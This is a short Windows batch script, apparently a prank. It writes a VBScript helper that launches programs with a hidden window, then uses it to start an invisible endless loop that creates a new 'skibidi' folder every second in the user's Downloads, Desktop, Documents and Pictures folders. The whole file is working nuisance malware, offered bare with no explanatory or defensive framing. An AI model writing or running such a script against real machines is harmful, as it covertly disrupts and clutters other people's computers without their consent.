@echo off

echo CreateObject("Wscript.Shell").Run """" ^& WScript.Arguments(0) ^& """", 0, True > "%~dp0invis.vbs"

set "newScript=%~dp0new_script.bat"
(
  echo @echo off
  echo set "count=1"
  echo :loop
  echo mkdir "%%USERPROFILE%%\Downloads\skibidi_%%count%%"
  echo mkdir "%%USERPROFILE%%\Desktop\skibidi_%%count%%"
  echo mkdir "%%USERPROFILE%%\Documents\skibidi_%%count%%"
  echo mkdir "%%USERPROFILE%%\Pictures\skibidi_%%count%%"
  echo set /a count+=1
  echo timeout /t 1 /nobreak >nul
  echo goto loop
) > "%newScript%"

wscript.exe "%~dp0invis.vbs" "%newScript%"

echo.